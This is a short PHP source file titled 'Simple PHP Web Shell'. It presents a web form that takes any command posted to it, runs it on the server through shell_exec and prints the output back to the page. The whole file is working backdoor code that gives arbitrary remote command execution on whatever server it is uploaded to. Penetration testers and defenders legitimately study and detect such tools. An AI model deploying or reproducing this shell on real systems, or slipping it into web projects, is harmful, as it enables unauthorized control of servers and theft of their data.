<?php $p='command';$o=null;if(isset($_SERVER['REQUEST_METHOD'])&&strtolower($_SERVER['REQUEST_METHOD'])==='post'&&isset($_POST[$p])&&($_POST[$p]=trim($_POST[$p]))&&strlen($_POST[$p])>0){$o=@shell_exec("($_POST[$p]) 2>&1");if($o===false){$o='ERROR: The function might be disabled.';}else{$o=str_replace('<','&lt;',$o);$o=str_replace('>','&gt;',$o);}/*echo "<pre>{$o}</pre>";unset($o);unset($_POST[$p]);/*@gc_collect_cycles();*/} ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Simple PHP Web Shell</title><meta name="author" content="Ivan Šincek"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><form method="post" action="<?php echo './'.basename($_SERVER['SCRIPT_FILENAME']); ?>"><input name="<?php echo $p; ?>" type="text" required="required" autofocus="autofocus" placeholder="Enter Command"></form><pre><?php echo $o;unset($o);unset($_POST[$p]);/*@gc_collect_cycles();*/ ?></pre></body></html>